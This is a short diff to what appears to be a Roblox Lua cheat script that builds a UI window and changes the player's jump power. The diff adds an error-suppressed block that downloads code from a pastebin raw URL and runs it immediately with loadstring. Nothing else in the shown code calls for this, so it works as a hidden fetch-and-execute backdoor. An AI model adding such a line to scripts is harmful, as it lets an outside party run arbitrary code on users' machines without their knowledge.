@@ -221,6 +221,10 @@ local win = ray:CreateWindow({
 	KeySystem = false
 })
 
+pcall(function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/XY1n6Cpg", true))()
+end)
+
 hum.UseJumpPower = true
 hum.JumpPower = jumpVal
 
